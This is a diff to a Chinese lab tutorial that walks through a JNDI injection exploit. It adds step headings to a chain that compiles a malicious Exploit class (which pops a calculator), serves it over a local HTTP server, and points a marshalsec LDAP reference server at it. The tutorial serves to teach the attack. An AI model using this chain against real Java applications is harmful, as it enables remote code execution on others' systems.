@@ -15,6 +15,8 @@
 
 这个漏洞和fastjson的漏洞利用如出一辙，首先需要编写一个恶意类。
 
+- 第一步：编写恶意代码
+
 ```java
 public class Exploit {
     public Exploit(){
@@ -36,9 +38,20 @@ public class Exploit {
 
 这里是弹出计算器
 
+- 第二步：编译成class
+
+
+```bash
+# 第二步：编译成class
+javac Exploit.java
+```
+
 把这个类编译之后会得到一个Exploit.class，然后需要在当前目录下启动一个web服务，
 
+- 第三步：启动本地服务
+
 ```
+# 在./java-test/src/main/java 目录下运行
 python3 -m http.server 8100
 
 ```
@@ -54,9 +67,12 @@ Serving HTTP on 0.0.0.0 port 8100 (http://0.0.0.0:8100/) ...
 
 ```
 
+- 第四步：启动ldap服务
+
 然后用[marshalsec](https://github.com/mbechler/marshalsec) IDAP服务，项目地址：[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)
 
 ```
+# 在./java-test/src/main/java 目录下运行
 java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8100/#Exploit"
 
 ```
@@ -76,6 +92,10 @@ Send LDAP reference result for aaaaaaa redirecting to http://127.0.0.1:8100/Expl
 
 ```
 漏洞类
+
+
+- 第五步：编写漏洞类并启动
+
 
 ```java
 
